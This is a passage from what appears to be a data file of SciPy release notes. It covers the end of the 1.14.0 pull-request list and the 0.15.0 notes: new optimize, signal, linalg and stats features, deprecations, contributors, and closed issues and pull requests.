performance by reducing overhead...\n* `20789 <https://github.com/scipy/scipy/pull/20789>`__: DEP: stats.linregress: deprecate one-arg use\n* `20790 <https://github.com/scipy/scipy/pull/20790>`__: BUG: special: remove redundant \\`Py_Initialize\\`\n* `20791 <https://github.com/scipy/scipy/pull/20791>`__: TST: optimize: fix failing tests for \\`_bracket_minimum\\`\n* `20792 <https://github.com/scipy/scipy/pull/20792>`__: BUG: sparse: Fix argmin/max shape diff between axis 0/1. And...\n* `20795 <https://github.com/scipy/scipy/pull/20795>`__: MAINT: fix warnings about \\`noexcept\\` and \\`except \\*\\` in Cython...\n* `20796 <https://github.com/scipy/scipy/pull/20796>`__: BLD: optimize: silence build warnings coming from HiGHS\n* `20798 <https://github.com/scipy/scipy/pull/20798>`__: MAINT: special: fix numpy initialization, avoid build warnings\n* `20799 <https://github.com/scipy/scipy/pull/20799>`__: DOC: ndimage: improve grayscale morphology docstrings\n* `20804 <https://github.com/scipy/scipy/pull/20804>`__: MAINT: remove pytest-fail-slow from pyproject.toml\n* `20805 <https://github.com/scipy/scipy/pull/20805>`__: BUG: special: Restore missing line of code in the function cchg().\n* `20807 <https://github.com/scipy/scipy/pull/20807>`__: TST: stats.nbinom: adjust cdf-ppf roundtrip test\n* `20812 <https://github.com/scipy/scipy/pull/20812>`__: DOC: extend \"building reproducible binaries\" page\n* `20815 <https://github.com/scipy/scipy/pull/20815>`__: DOC: integrate: odeint user functions must not modify y.\n* `20819 <https://github.com/scipy/scipy/pull/20819>`__: REV: revert accidental \\`cobyqa\\` update in gh-17924\n* `20820 <https://github.com/scipy/scipy/pull/20820>`__: BLD: Warning fix from \\`\\`scipy/special/special/gamma.h\\`\\`\n* `20828 <https://github.com/scipy/scipy/pull/20828>`__: DEP: deprecate trapz alias of \\`stats.trapezoid\\` distribution\n* `20831 <https://github.com/scipy/scipy/pull/20831>`__: MAINT: version pins/prep for 1.14.0rc1\n* `20838 <https://github.com/scipy/scipy/pull/20838>`__: DOC: sparse: 1.14.0 release notes additions\n* `20839 <https://github.com/scipy/scipy/pull/20839>`__: REL: set 1.14.0rc2 unreleased\n* `20841 <https://github.com/scipy/scipy/pull/20841>`__: DOC: add cobyqa website reference\n* `20851 <https://github.com/scipy/scipy/pull/20851>`__: DOC: add cobyqa website reference (#20841)\n* `20858 <https://github.com/scipy/scipy/pull/20858>`__: MAINT: \\`stats.bootstrap\\`: emit \\`FutureWarning\\` about broadcasting\n* `20870 <https://github.com/scipy/scipy/pull/20870>`__: BLD: test delocate works by removing original lib [wheel build]\n* `20881 <https://github.com/scipy/scipy/pull/20881>`__: DOC: mailing list to forum\n* `20890 <https://github.com/scipy/scipy/pull/20890>`__: DOC: Write API reference titles in monospace font\n* `20909 <https://github.com/scipy/scipy/pull/20909>`__: DEP: special.perm: deprecate non-integer \\`N\\` and \\`k\\` with...\n* `20914 <https://github.com/scipy/scipy/pull/20914>`__: TST: linalg: bump tolerance in \\`TestEig::test_singular\\`\n* `20919 <https://github.com/scipy/scipy/pull/20919>`__: BLD: optimize: use hidden visibility for static HiGHS libraries\n* `20920 <https://github.com/scipy/scipy/pull/20920>`__: MAINT: special: fix msvc build by using \\`new\\` and \\`delete\\`...\n* `20923 <https://github.com/scipy/scipy/pull/20923>`__: DOC: update doctests to satisfy scipy-doctests==1.2.0\n* `20927 <https://github.com/scipy/scipy/pull/20927>`__: MAINT: adapt to a scipy-doctests change\n* `20933 <https://github.com/scipy/scipy/pull/20933>`__: MAINT: 1.14.0rc2 backports\n* `20936 <https://github.com/scipy/scipy/pull/20936>`__: DOC: \\`array_api.rst\\`: update 1.14 functions with array API...\n* `20937 <https://github.com/scipy/scipy/pull/20937>`__: BUG/BLD: special: Ensure symbols in \\`sf_error_state\\` shared...\n* `20945 <https://github.com/scipy/scipy/pull/20945>`__: TST: address tolerance violations with SciPy 1.14.0rc1 on linux-{aarch64,ppc64le}\n* `20952 <https://github.com/scipy/scipy/pull/20952>`__: TST: loosen tolerance in test_x0_working to pass with alternate...\n* `20953 <https://github.com/scipy/scipy/pull/20953>`__: TST: loosen tolerance in test_krandinit slightly to pass with...\n* `20961 <https://github.com/scipy/scipy/pull/20961>`__: TST: robustify test_nnls_inner_loop_case1\n* `20970 <https://github.com/scipy/scipy/pull/20970>`__: REL: set 1.14.0 rc3 unreleased\n* `20973 <https://github.com/scipy/scipy/pull/20973>`__: TST:sparse.linalg: Skip test due to sensitivity to numerical...\n* `20979 <https://github.com/scipy/scipy/pull/20979>`__: STY: \\`_lib._util\\`: address new mypy complaint in main\n\n\n==========================\n", "0.15.0": "several new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  There have been a number of deprecations and\nAPI changes in this release, which are documented below.  All users\nare encouraged to upgrade to this release, as there are a large number\nof bug-fixes and optimizations.  Moreover, our development attention\nwill now shift to bug-fix releases on the 0.16.x branch, and on adding\nnew features on the master branch.\n\nThis release requires Python 2.6, 2.7 or 3.2-3.4 and NumPy 1.5.1 or greater.\n\n\nNew features\n============\n\nLinear Programming Interface\n----------------------------\n\nThe new function `scipy.optimize.linprog` provides a generic\nlinear programming similar to the way `scipy.optimize.minimize`\nprovides a generic interface to nonlinear programming optimizers.\nCurrently the only method supported is *simplex* which provides\na two-phase, dense-matrix-based simplex algorithm. Callbacks\nfunctions are supported, allowing the user to monitor the progress\nof the algorithm.\n\nDifferential evolution, a global optimizer\n------------------------------------------\n\nA new `scipy.optimize.differential_evolution` function has been added to the\n``optimize`` module.  Differential Evolution is an algorithm used for finding\nthe global minimum of multivariate functions. It is stochastic in nature (does\nnot use gradient methods), and can search large areas of candidate space, but\noften requires larger numbers of function evaluations than conventional\ngradient based techniques.\n\n``scipy.signal`` improvements\n-----------------------------\n\nThe function `scipy.signal.max_len_seq` was added, which computes a Maximum\nLength Sequence (MLS) signal.\n\n``scipy.integrate`` improvements\n--------------------------------\n\nIt is now possible to use `scipy.integrate` routines to integrate\nmultivariate ctypes functions, thus avoiding callbacks to Python and\nproviding better performance.\n\n``scipy.linalg`` improvements\n-----------------------------\n\nThe function `scipy.linalg.orthogonal_procrustes` for solving the procrustes\nlinear algebra problem was added.\n\nBLAS level 2 functions ``her``, ``syr``, ``her2`` and ``syr2`` are now wrapped\nin ``scipy.linalg``.\n\n``scipy.sparse`` improvements\n-----------------------------\n\n`scipy.sparse.linalg.svds` can now take a ``LinearOperator`` as its main input.\n\n``scipy.special`` improvements\n------------------------------\n\nValues of ellipsoidal harmonic (i.e. Lame) functions and associated\nnormalization constants can be now computed using ``ellip_harm``,\n``ellip_harm_2``, and ``ellip_normal``.\n\nNew convenience functions ``entr``, ``rel_entr`` ``kl_div``,\n``huber``, and ``pseudo_huber`` were added.\n\n``scipy.sparse.csgraph`` improvements\n-------------------------------------\n\nRoutines ``reverse_cuthill_mckee`` and ``maximum_bipartite_matching``\nfor computing reorderings of sparse graphs were added.\n\n``scipy.stats`` improvements\n----------------------------\n\nAdded a Dirichlet multivariate distribution, ``scipy.stats.dirichlet``.\n\nThe new function `scipy.stats.median_test` computes Mood's median test.\n\nThe new function `scipy.stats.combine_pvalues` implements Fisher's\nand Stouffer's methods for combining p-values.\n\n`scipy.stats.describe` returns a namedtuple rather than a tuple, allowing\nusers to access results by index or by name.\n\n\nDeprecated features\n===================\n\nThe `scipy.weave` module is deprecated.  It was the only module never ported\nto Python 3.x, and is not recommended to be used for new code - use Cython\ninstead.  In order to support existing code, ``scipy.weave`` has been packaged\nseparately: https://github.com/scipy/weave.  It is a pure Python package, and\ncan easily be installed with ``pip install weave``.\n\n``scipy.special.bessel_diff_formula`` is deprecated.  It is a private function,\nand therefore will be removed from the public API in a following release.\n\n``scipy.stats.nanmean``, ``nanmedian`` and ``nanstd`` functions are deprecated\nin favor of their numpy equivalents.\n\n\nBackwards incompatible changes\n==============================\n\nscipy.ndimage\n-------------\n\nThe functions `scipy.ndimage.minimum_positions`,\n`scipy.ndimage.maximum_positions`` and `scipy.ndimage.extrema` return\npositions as ints instead of floats.\n\nscipy.integrate\n---------------\n\nThe format of banded Jacobians in `scipy.integrate.ode` solvers is\nchanged. Note that the previous documentation of this feature was\nerroneous.\n\nAuthors\n=======\n\n* Abject +\n* Ankit Agrawal +\n* Sylvain Bellemare +\n* Matthew Brett\n* Christian Brodbeck\n* Christian Brueffer\n* Lars Buitinck\n* Evgeni Burovski\n* Pierre de Buyl +\n* Greg Caporaso +\n* CJ Carey\n* Jacob Carey +\n* Thomas A Caswell\n* Helder Cesar +\n* Bj\u00f6rn Dahlgren +\n* Kevin Davies +\n* Yotam Doron +\n* Marcos Duarte +\n* endolith\n* Jesse Engel +\n* Rob Falck +\n* Corey Farwell +\n* Jaime Fernandez del Rio +\n* Clark Fitzgerald +\n* Tom Flannaghan +\n* Chad Fulton +\n* Jochen Garcke +\n* Fran\u00e7ois Garillot +\n* Andr\u00e9 Gaul\n* Christoph Gohlke\n* Ralf Gommers\n* Alex Griffing\n* Blake Griffith\n* Olivier Grisel\n* Charles Harris\n* Trent Hauck +\n* Ian Henriksen +\n* Jinhyok Heo +\n* Matt Hickford +\n* Andreas Hilboll\n* Danilo Horta +\n* David Men\u00e9ndez Hurtado +\n* Gert-Ludwig Ingold\n* Thouis (Ray) Jones\n* Chris Kerr +\n* Carl Kleffner +\n* Andreas Kloeckner\n* Thomas Kluyver +\n* Adrian Kretz +\n* Johannes Kulick +\n* Eric Larson\n* Brianna Laugher +\n* Denis Laxalde\n* Antony Lee +\n* Gregory R. Lee +\n* Brandon Liu\n* Alex Loew +\n* Lo\u00efc Est\u00e8ve +\n* Jaakko Luttinen +\n* Benny Malengier\n* Tobias Megies +\n* Sturla Molden\n* Eric Moore\n* Brett R. Murphy +\n* Paul Nation +\n* Andrew Nelson\n* Brian Newsom +\n* Joel Nothman\n* Sergio Oller +\n* Janani Padmanabhan +\n* Tiago M.D. Pereira +\n* Nicolas Del Piano +\n* Manuel Reinhardt +\n* Thomas Robitaille\n* Mike Romberg +\n* Alex Rothberg +\n* Sebastian P\u00f6lsterl +\n* Maximilian Singh +\n* Brigitta Sipocz +\n* Alex Stewart +\n* Julian Taylor\n* Collin Tokheim +\n* James Tomlinson +\n* Benjamin Trendelkamp-Schroer +\n* Richard Tsai\n* Alexey Umnov +\n* Jacob Vanderplas\n* Joris Vankerschaver\n* Bastian Venthur +\n* Pauli Virtanen\n* Stefan van der Walt\n* Yuxiang Wang +\n* James T. Webber\n* Warren Weckesser\n* Axl West +\n* Nathan Woods\n* Benda Xu +\n* V\u00edctor Zabalza +\n* Tiziano Zito +\n\nA total of 99 people contributed to this release.\nPeople with a \"+\" by their names contributed a patch for the first time.\nThis list of names is automatically generated, and may not be fully complete.\n\n\nIssues closed\n-------------\n\n- `1431 <https://github.com/scipy/scipy/issues/1431>`__: ellipk(x) extending its domain for x<0 (Trac #904)\n- `1727 <https://github.com/scipy/scipy/issues/1727>`__: consistency of std interface (Trac #1200)\n- `1851 <https://github.com/scipy/scipy/issues/1851>`__: Shape parameter negated in genextreme (relative to R, MATLAB,...\n- `1889 <https://github.com/scipy/scipy/issues/1889>`__: interp2d is weird (Trac #1364)\n- `2188 <https://github.com/scipy/scipy/issues/2188>`__: splev gives wrong values or crashes outside of support when der...\n- `2343 <https://github.com/scipy/scipy/issues/2343>`__: scipy.insterpolate's splrep function fails with certain combinations...\n- `2669 <https://github.com/scipy/scipy/issues/2669>`__: .signal.ltisys.ss2tf should only apply to MISO systems in current...\n- `2911 <https://github.com/scipy/scipy/issues/2911>`__: interpolate.splder() failure on Fedora\n- `3171 <https://github.com/scipy/scipy/issues/3171>`__: future of weave in scipy\n- `3176 <https://github.com/scipy/scipy/issues/3176>`__: Suggestion to improve error message in scipy.integrate.odeint\n- `3198 <https://github.com/scipy/scipy/issues/3198>`__: pdf() and logpdf() methods for scipy.stats.gaussian_kde\n- `3318 <https://github.com/scipy/scipy/issues/3318>`__: Travis CI is breaking on test(\"full\")\n- `3329 <https://github.com/scipy/scipy/issues/3329>`__: scipy.stats.scoreatpercentile backward-incompatible change not...\n- `3362 <https://github.com/scipy/scipy/issues/3362>`__: Reference cycle in scipy.sparse.linalg.eigs with shift-invert...\n- `3364 <https://github.com/scipy/scipy/issues/3364>`__: BUG: linalg.hessenberg broken (wrong results)\n- `3376 <https://github.com/scipy/scipy/issues/3376>`__: stats f_oneway needs floats\n- `3379 <https://github.com/scipy/scipy/issues/3379>`__: Installation of scipy 0.13.3 via zc.buildout fails\n- `3403 <https://github.com/scipy/scipy/issues/3403>`__: hierarchy.linkage raises an ugly exception for a compressed 2x2...\n- `3422 <https://github.com/scipy/scipy/issues/3422>`__: optimize.curve_fit() handles NaN by returning all parameters...\n- `3457 <https://github.com/scipy/scipy/issues/3457>`__: linalg.fractional_matrix_power has no docstring\n- `3469 <https://github.com/scipy/scipy/issues/3469>`__: DOC: `ndimage.find_object` ignores zero-values\n- `3491 <https://github.com/scipy/scipy/issues/3491>`__: optimize.leastsq() documentation should mention it does not work...\n- `3499 <https://github.com/scipy/scipy/issues/3499>`__: cluster.vq.whiten return nan for all zeros column in observations\n- `3503 <https://github.com/scipy/scipy/issues/3503>`__: minimize attempts to do vector addition when numpy arrays are...\n- `3508 <https://github.com/scipy/scipy/issues/3508>`__: exponweib.logpdf fails for valid parameters\n- `3509 <https://github.com/scipy/scipy/issues/3509>`__: libatlas3-base-dev does not exist\n- `3550 <https://github.com/scipy/scipy/issues/3550>`__: BUG: anomalous values computed by special.ellipkinc\n- `3555 <https://github.com/scipy/scipy/issues/3555>`__: `scipy.ndimage` positions are float instead of int\n- `3557 <https://github.com/scipy/scipy/issues/3557>`__: UnivariateSpline.__call__ should pass all relevant args through...\n- `3569 <https://github.com/scipy/scipy/issues/3569>`__: No license statement for test data imported from boost?\n- `3576 <https://github.com/scipy/scipy/issues/3576>`__: mstats test failure (too sensitive?)\n- `3579 <https://github.com/scipy/scipy/issues/3579>`__: Errors on scipy 0.14.x branch using MKL, Ubuntu 14.04 x86_64\n- `3580 <https://github.com/scipy/scipy/issues/3580>`__: Operator overloading with sparse matrices\n- `3587 <https://github.com/scipy/scipy/issues/3587>`__: Wrong alphabetical order in continuous statistical distribution...\n- `3596 <https://github.com/scipy/scipy/issues/3596>`__: scipy.signal.fftconvolve no longer threadsafe\n- `3623 <https://github.com/scipy/scipy/issues/3623>`__: BUG: signal.convolve takes longer than it needs to\n- `3655 <https://github.com/scipy/scipy/issues/3655>`__: Integer returned from integer data in scipy.signal.periodogram...\n- `3662 <https://github.com/scipy/scipy/issues/3662>`__: Travis failure on Numpy 1.5.1 (not reproducible?)\n- `3668 <https://github.com/scipy/scipy/issues/3668>`__: dendogram(orientation='foo')\n- `3669 <https://github.com/scipy/scipy/issues/3669>`__: KroghInterpolator doesn't pass through points\n- `3672 <https://github.com/scipy/scipy/issues/3672>`__: Inserting a knot in a spline\n- `3682 <https://github.com/scipy/scipy/issues/3682>`__: misleading documentation of scipy.optimize.curve_fit\n- `3699 <https://github.com/scipy/scipy/issues/3699>`__: BUG?: minor problem with scipy.signal.lfilter w/initial conditions\n- `3700 <https://github.com/scipy/scipy/issues/3700>`__: Inconsistent exceptions raised by scipy.io.loadmat\n- `3703 <https://github.com/scipy/scipy/issues/3703>`__: TypeError for RegularGridInterpolator with big-endian data\n- `3714 <https://github.com/scipy/scipy/issues/3714>`__: Misleading error message in eigsh: k must be between 1 and rank(A)-1\n- `3720 <https://github.com/scipy/scipy/issues/3720>`__: coo_matrix.setdiag() fails\n- `3740 <https://github.com/scipy/scipy/issues/3740>`__: Scipy.Spatial.KdTree (Query) Return Type?\n- `3761 <https://github.com/scipy/scipy/issues/3761>`__: Invalid result from scipy.special.btdtri\n- `3784 <https://github.com/scipy/scipy/issues/3784>`__: DOC - Special Functions - Drum example fix for higher modes\n- `3785 <https://github.com/scipy/scipy/issues/3785>`__: minimize() should have friendlier args=\n- `3787 <https://github.com/scipy/scipy/issues/3787>`__: BUG: signal: Division by zero in lombscargle\n- `3800 <https://github.com/scipy/scipy/issues/3800>`__: BUG: scipy.sparse.csgraph.shortest_path overwrites input matrix\n- `3817 <https://github.com/scipy/scipy/issues/3817>`__: Warning in calculating moments from Binomial distribution for...\n- `3821 <https://github.com/scipy/scipy/issues/3821>`__: review scipy usage of `np.ma.is_masked`\n- `3829 <https://github.com/scipy/scipy/issues/3829>`__: Linear algebra function documentation doesn't mention default...\n- `3830 <https://github.com/scipy/scipy/issues/3830>`__: A bug in Docstring of scipy.linalg.eig\n- `3844 <https://github.com/scipy/scipy/issues/3844>`__: Issue with shape parameter returned by genextreme\n- `3858 <https://github.com/scipy/scipy/issues/3858>`__: \"ImportError: No module named Cython.Compiler.Main\" on install\n- `3876 <https://github.com/scipy/scipy/issues/3876>`__: savgol_filter not in release notes and has no versionadded\n- `3884 <https://github.com/scipy/scipy/issues/3884>`__: scipy.stats.kendalltau empty array error\n- `3895 <https://github.com/scipy/scipy/issues/3895>`__: ValueError: illegal value in 12-th argument of internal gesdd...\n- `3898 <https://github.com/scipy/scipy/issues/3898>`__: skimage test broken by minmax filter change\n- `3901 <https://github.com/scipy/scipy/issues/3901>`__: scipy sparse errors with numpy master\n- `3905 <https://github.com/scipy/scipy/issues/3905>`__: DOC: optimize: linprog docstring has two \"Returns\" sections\n- `3915 <https://github.com/scipy/scipy/issues/3915>`__: DOC: sphinx warnings because of `**kwds` in the stats distributions...\n- `3935 <https://github.com/scipy/scipy/issues/3935>`__: Split stats.distributions files in tutorial\n- `3969 <https://github.com/scipy/scipy/issues/3969>`__: gh-3607 breaks backward compatibility in ode solver banded jacobians\n- `4025 <https://github.com/scipy/scipy/issues/4025>`__: DOC: signal: The return value of find_peaks_cwt is not documented.\n- `4029 <https://github.com/scipy/scipy/issues/4029>`__: scipy.stats.nbinom.logpmf(0,1,1) returns nan. Correct value is...\n- `4032 <https://github.com/scipy/scipy/issues/4032>`__: ERROR: test_imresize (test_pilutil.TestPILUtil)\n- `4038 <https://github.com/scipy/scipy/issues/4038>`__: errors do not propagate through scipy.integrate.odeint properly\n- `4171 <https://github.com/scipy/scipy/issues/4171>`__: orthogonal_procrustes always returns scale.\n- `4176 <https://github.com/scipy/scipy/issues/4176>`__: Solving the Discrete Lyapunov Equation does not work with matrix...\n\n\nPull requests\n-------------\n\n- `3109 <https://github.com/scipy/scipy/pull/3109>`__: ENH Added Fisher's method and Stouffer's Z-score method\n- `3225 <https://github.com/scipy/scipy/pull/3225>`__: Add the limiting distributions to generalized Pareto distribution...\n- `3262 <https://github.com/scipy/scipy/pull/3262>`__: Implement back end of faster multivariate integration\n- `3266 <https://github.com/scipy/scipy/pull/3266>`__: ENH: signal: add type=False as parameter for periodogram and...\n- `3273 <https://github.com/scipy/scipy/pull/3273>`__: Add PEP8 check to Travis-CI\n- `3342 <https://github.com/scipy/scipy/pull/3342>`__: ENH: linprog function for linear programming\n- `3348 <https://github.com/scipy/scipy/pull/3348>`__: BUG: add proper error handling when using interp2d on regular...\n- `3351 <https://github.com/scipy/scipy/pull/3351>`__: ENH: Add MLS method\n- `3382 <https://github.com/scipy/scipy/pull/3382>`__: ENH: scipy.special information theory functions\n- `3396 <https://github.com/scipy/scipy/pull/3396>`__: ENH: improve stats.nanmedian more by assuming nans are rare\n- `3398 <https://github.com/scipy/scipy/pull/3398>`__: Added two wrappers to the gaussian_kde class.\n- `3405 <https://github.com/scipy/scipy/pull/3405>`__: BUG: cluster.linkage array conversion to double dtype\n- `3407 <https://github.com/scipy/scipy/pull/3407>`__: MAINT: use assert_warns instead of a more complicated mechanism\n- `3409 <https://github.com/scipy/scipy/pull/3409>`__: ENH: change to use array view in signal/_peak_finding.py\n- `3416 <https://github.com/scipy/scipy/pull/3416>`__: Issue 3376 : stats f_oneway needs floats\n- `3419 <https://github.com/scipy/scipy/pull/3419>`__: BUG: tools: Fix list of FMA instructions in detect_cpu_extensions_wine.py\n- `3420 <https://github.com/scipy/scipy/pull/3420>`__: DOC: stats: Add 'entropy' to the stats package-level documentation.\n- `3429 <https://github.com/scipy/scipy/pull/3429>`__: BUG: close intermediate file descriptor right after it is used...\n- `3430 <https://github.com/scipy/scipy/pull/3430>`__: MAINT: Fix some cython variable declarations to avoid warnings...\n- `3433 <https://github.com/scipy/scipy/pull/3433>`__: Correcting the normalization of chebwin window function\n- `3435 <https://github.com/scipy/scipy/pull/3435>`__: Add more precise link to R's quantile documentation\n- `3446 <https://github.com/scipy/scipy/pull/3446>`__: ENH: scipy.optimize - adding differential_evolution\n- `3450 <https://github.com/scipy/scipy/pull/3450>`__: MAINT: remove unused function scipy.stats.mstats_basic._kolmog1\n- `3458 <https://github.com/scipy/scipy/pull/3458>`__: Reworked version of PR-3084 (mstats-stats comparison)\n- `3462 <https://github.com/scipy/scipy/pull/3462>`__: MAINT : Returning a warning for low attenuation values of chebwin...\n- `3463 <https://github.com/scipy/scipy/pull/3463>`__: DOC: linalg: Add examples to functions in matfuncs.py\n- `3477 <https://github.com/scipy/scipy/pull/3477>`__: ENH: sparse: release GIL in sparsetools routines\n- `3480 <https://github.com/scipy/scipy/pull/3480>`__: DOC: Add more details to deconvolve docstring\n- `3484 <https://github.com/scipy/scipy/pull/3484>`__: BLD: fix Qhull build issue with MinGW-w64. Closes gh-3237.\n- `3498 <https://github.com/scipy/scipy/pull/3498>`__: MAINT: io: remove old warnings from idl.py\n- `3504 <https://github.com/scipy/scipy/pull/3504>`__: BUG: cluster.vq.whiten returns nan or inf when std==0\n- `3510 <https://github.com/scipy/scipy/pull/3510>`__: MAINT: stats: Reimplement the pdf and logpdf methods of exponweib.\n- `3512 <https://github.com/scipy/scipy/pull/3512>`__: Fix PEP8 errors showing up on TravisCI after pep8 1.5 release\n- `3514 <https://github.com/scipy/scipy/pull/3514>`__: DOC: libatlas3-base-dev seems to have never been a thing\n- `3516 <https://github.com/scipy/scipy/pull/3516>`__: DOC improve scipy.sparse docstrings\n- `3517 <https://github.com/scipy/scipy/pull/3517>`__: ENH: speed-up ndimage.filters.min(max)imum_filter1d\n- `3518 <https://github.com/scipy/scipy/pull/3518>`__: Issues in scipy.misc.logsumexp\n- `3526 <https://github.com/scipy/scipy/pull/3526>`__: DOC: graphical example for cwt, and use a more interesting signal\n- `3527 <https://github.com/scipy/scipy/pull/3527>`__: ENH: Implement min(max)imum_filter1d using the MINLIST algorithm\n- `3537 <https://github.com/scipy/scipy/pull/3537>`__: STY: reduce number of C compiler warnings\n- `3540 <https://github.com/scipy/scipy/pull/3540>`__: DOC: linalg: add docstring to fractional_matrix_power\n- `3542 <https://github.com/scipy/scipy/pull/3542>`__: kde.py Doc Typo\n- `3545 <https://github.com/scipy/scipy/pull/3545>`__: BUG: stats: stats.levy.cdf with small arguments loses precision.\n- `3547 <https://github.com/scipy/scipy/pull/3547>`__: BUG: special: erfcinv with small arguments loses precision.\n- `3553 <https://github.com/scipy/scipy/pull/3553>`__: DOC: Convolve examples\n- `3561 <https://github.com/scipy/scipy/pull/3561>`__: FIX: in ndimage.measurements return positions as int instead...\n- `3564 <https://github.com/scipy/scipy/pull/3564>`__: Fix test failures with numpy master. Closes gh-3554\n- `3565 <https://github.com/scipy/scipy/pull/3565>`__: ENH: make interp2d accept unsorted arrays for interpolation.\n- `3566 <https://github.com/scipy/scipy/pull/3566>`__: BLD: add numpy requirement to metadata if it can't be imported.\n- `3567 <https://github.com/scipy/scipy/pull/3567>`__: DOC: move matfuncs docstrings to user-visible functions\n- `3574 <https://github.com/scipy/scipy/pull/3574>`__: Fixes multiple bugs in mstats.theilslopes\n- `3577 <https://github.com/scipy/scipy/pull/3577>`__: TST: decrease sensitivity of an mstats test\n- `3585 <https://github.com/scipy/scipy/pull/3585>`__: Cleanup of code in scipy.constants\n- `3589 <https://github.com/scipy/scipy/pull/3589>`__: BUG: sparse: allow operator overloading\n- `3594 <https://github.com/scipy/scipy/pull/3594>`__: BUG: lobpcg returned wrong values for small matrices (n < 10)\n- `3598 <https://github.com/scipy/scipy/pull/3598>`__: MAINT: fix coverage and coveralls\n- `3599 <https://github.com/scipy/scipy/pull/3599>`__: MAINT: symeig -- now that's a name I've not heard in a long time\n- `3602 <https://github.com/scipy/scipy/pull/3602>`__: MAINT: clean up the new optimize.linprog and add a few more tests\n- `3607 <https://github.com/scipy/scipy/pull/3607>`__: BUG: integrate: Fix some bugs and documentation errors in the...\n- `3609 <https://github.com/scipy/scipy/pull/3609>`__: MAINT integrate/odepack: kill dead Fortran code\n- `3616 <https://github.com/scipy/scipy/pull/3616>`__: FIX: Invalid values\n- `3617 <https://github.com/scipy/scipy/pull/3617>`__: Sort netcdf variables in a Python-3 compatible way\n- `3622 <https://github.com/scipy/scipy/pull/3622>`__: DOC: Added 0.15.0 release notes entry for linprog function.\n- `3625 <https://github.com/scipy/scipy/pull/3625>`__: Fix documentation for cKDTree.sparse_distance_matrix\n- `3626 <https://github.com/scipy/scipy/pull/3626>`__: MAINT: linalg.orth memory efficiency\n- `3627 <https://github.com/scipy/scipy/pull/3627>`__: MAINT: stats: A bit of clean up\n- `3628 <https://github.com/scipy/scipy/pull/3628>`__: MAINT: signal: remove a useless function from wavelets.py\n- `3632 <https://github.com/scipy/scipy/pull/3632>`__: ENH: stats: Add Mood's median test.\n- `3636 <https://github.com/scipy/scipy/pull/3636>`__: MAINT: cluster: some clean up\n- `3638 <https://github.com/scipy/scipy/pull/3638>`__: DOC: docstring of optimize.basinhopping confuses singular and...\n- `3639 <https://github.com/scipy/scipy/pull/3639>`__: BUG: change ddof default to 1 in mstats.sem, consistent with...\n- `3640 <https://github.com/scipy/scipy/pull/3640>`__: Weave: deprecate the module and disable slow tests on TravisCI\n- `3641 <https://github.com/scipy/scipy/pull/3641>`__: ENH: Added support for date attributes to io.arff.arffread\n- `3644 <https://github.com/scipy/scipy/pull/3644>`__: MAINT: stats: remove superfluous alias in mstats_basic.py\n- `3646 <https://github.com/scipy/scipy/pull/3646>`__: ENH: adding `sum_duplicates` method to COO sparse matrix\n- `3647 <https://github.com/scipy/scipy/pull/3647>`__: Fix for #3596: Make fftconvolve threadsafe\n- `3650 <https://github.com/scipy/scipy/pull/3650>`__: BUG: sparse: smarter random index selection\n- `3652 <https://github.com/scipy/scipy/pull/3652>`__: fix wrong option name in power_divergence dosctring example\n- `3654 <https://github.com/scipy/scipy/pull/3654>`__: Changing EPD to Canopy\n- `3657 <https://github.com/scipy/scipy/pull/3657>`__: BUG: signal.welch: ensure floating point dtype regardless of...\n- `3660 <https://github.com/scipy/scipy/pull/3660>`__: TST: mark a test as known fail\n- `3661 <https://github.com/scipy/scipy/pull/3661>`__: BLD: ignore pep8 E302 (expected 2 blank lines, found 1)\n- `3663 <https://github.com/scipy/scipy/pull/3663>`__: BUG: fix leaking errstate, and ignore invalid= errors in a test\n- `3664 <https://github.com/scipy/scipy/pull/3664>`__: BUG: correlate was extremely slow when in2.size > in1.size\n- `3667 <https://github.com/scipy/scipy/pull/3667>`__: ENH: Adds default params to pdfs of multivariate_norm\n- `3670 <https://github.com/scipy/scipy/pull/3670>`__: ENH: Small speedup of FFT size check\n- `3671 <https://github.com/scipy/scipy/pull/3671>`__: DOC: adding differential_evolution function to 0.15 release notes\n- `3673 <https://github.com/scipy/scipy/pull/3673>`__: BUG: interpolate/fitpack: arguments to fortran routines may not...\n- `3674 <https://github.com/scipy/scipy/pull/3674>`__: Add support for appending to existing netcdf files\n- `3681 <https://github.com/scipy/scipy/pull/3681>`__: Speed up test('full'), solve Travis CI timeout issues\n- `3683 <https://github.com/scipy/scipy/pull/3683>`__: ENH: cluster: rewrite and optimize `vq` in Cython\n- `3684 <https://github.com/scipy/scipy/pull/3684>`__: Update special docs\n- `3688 <https://github.com/scipy/scipy/pull/3688>`__: Spacing in special docstrings\n- `3692 <https://github.com/scipy/scipy/pull/3692>`__: ENH: scipy.special: Improving sph_harm function\n- `3693 <https://github.com/scipy/scipy/pull/3693>`__: Update refguide entries for signal and fftpack\n- `3695 <https://github.com/scipy/scipy/pull/3695>`__: Update continuous.rst\n- `3696 <https://github.com/scipy/scipy/pull/3696>`__: ENH: check for valid 'orientation' kwarg in dendrogram()\n- `3701 <https://github.com/scipy/scipy/pull/3701>`__: make 'a' and 'b' coefficients atleast_1d array in filtfilt\n- `3702 <https://github.com/scipy/scipy/pull/3702>`__: BUG: cluster: _vq unable to handle large features\n- `3704 <https://github.com/scipy/scipy/pull/3704>`__: BUG: special: ellip(k,e)inc nan and double expected value\n- `3707 <https://github.com/scipy/scipy/pull/3707>`__: BUG: handle fill_value dtype checks correctly in RegularGridInterpolator\n- `3708 <https://github.com/scipy/scipy/pull/3708>`__: Reraise exception on failure to read mat file.\n- `3709 <https://github.com/scipy/scipy/pull/3709>`__: BUG: cast 'x' to correct dtype in KroghInterpolator._evaluate\n- `3712 <https://github.com/scipy/scipy/pull/3712>`__: ENH: cluster: reimplement the update-step of K-means in Cython\n- `3713 <https://github.com/scipy/scipy/pull/3713>`__: FIX: Check type of lfiltic\n- `3718 <https://github.com/scipy/scipy/pull/3718>`__: Changed INSTALL file extension to rst\n- `3719 <https://github.com/scipy/scipy/pull/3719>`__: address svds returning nans for zero input matrix\n- `3722 <https://github.com/scipy/scipy/pull/3722>`__: MAINT: spatial: static, unused code, sqrt(sqeuclidean)\n- `3725 <https://github.com/scipy/scipy/pull/3725>`__: ENH: use numpys nanmedian if available\n- `3727 <https://github.com/scipy/scipy/pull/3727>`__: TST: add a new fixed_point test and change some test function...\n- `3731 <https://github.com/scipy/scipy/pull/3731>`__: BUG: fix romb in scipy.integrate.quadrature\n- `3734 <https://github.com/scipy/scipy/pull/3734>`__: DOC: simplify examples with semilogx\n- `3735 <https://github.com/scipy/scipy/pull/3735>`__: DOC: Add minimal docstrings to 